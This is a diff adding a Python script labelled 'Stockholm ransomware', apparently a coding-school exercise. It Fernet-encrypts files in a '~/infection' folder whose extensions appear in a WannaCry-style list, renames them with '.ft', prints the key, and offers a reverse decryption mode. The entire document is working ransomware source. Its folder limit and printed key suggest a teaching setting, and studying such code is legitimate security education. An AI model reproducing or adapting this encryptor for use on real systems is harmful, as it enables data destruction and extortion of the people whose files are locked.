@@ -1,2 +1,88 @@
 #!/usr/bin/env python3
 
+import argparse, sys, os
+from cryptography.fernet import Fernet
+
+
+def parse_arguments():
+    parser = argparse.ArgumentParser("Stockholm ransomware", conflict_handler="resolve")
+    parser.add_argument('-v', '--version', action="store_true", help="Get version")
+    parser.add_argument('-r', '--reverse', type=str, help="Reverse infection")
+    parser.add_argument('-s', '--silent', action="store_true", help="Silent infection")
+    return parser.parse_args()
+
+
+def gen_key():
+    return Fernet.generate_key().decode('utf-8')
+
+
+def crypt(file_path, key):
+    cipher_suite = Fernet(key.encode('utf-8'))
+    with open(file_path, 'rb') as file_to_encrypt:
+        file_contents = file_to_encrypt.read()
+    encrypted_contents = cipher_suite.encrypt(file_contents)
+    with open(file_path, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted_contents)
+
+
+def decrypt(file_path, key):
+    cipher_suite = Fernet(key.encode('utf-8'))
+    with open(file_path, 'rb') as file_to_decrypt:
+        encrypted_contents = file_to_decrypt.read()
+    decrypted_contents = cipher_suite.decrypt(encrypted_contents)
+    with open(file_path, 'wb') as decrypted_file:
+        decrypted_file.write(decrypted_contents)
+    original_filename = file_path.rsplit('.', 1)[0]
+    os.rename(file_path, original_filename)
+
+
+def rename(file):
+    os.rename(file, file + '.ft')
+
+
+def read_extensions():
+    try:
+        with open('wannacry_ext.txt', 'r') as file:
+            return set(line.strip() for line in file)
+    except FileNotFoundError:
+        print("File wannacry_ext.txt not found")
+        sys.exit(1)
+
+
+def main():
+    args = parse_arguments()
+    targeted_extensions = read_extensions()
+
+    if args.version:
+        print("1.0")
+        sys.exit(0)
+
+    if args.reverse:
+            key = args.reverse
+            target = os.path.join(os.environ['HOME'], 'infection')
+            for root, dirs, files in os.walk(target):
+                for file in files:
+                    filepath = os.path.join(root, file)
+                    decrypt(filepath, key)
+                    print(f"{filepath} decrypted")
+    else:
+        target = os.path.join(os.environ['HOME'], 'infection')
+        if not os.path.isdir(target):
+            print(f"Directory {target} does not exist")
+            sys.exit(1)
+
+        key = gen_key()
+        print(f"Key: {key}")
+        for root, dirs, files in os.walk(target):
+            for file in files:
+                _, ext = os.path.splitext(file)
+                if ext in targeted_extensions:
+                    filepath = os.path.join(root, file)
+                    crypt(filepath, key)
+                    print(f"{file} crypted")
+                    rename(filepath)
+        print("Encryption done")
+
+
+if __name__ == "__main__":
+    main()
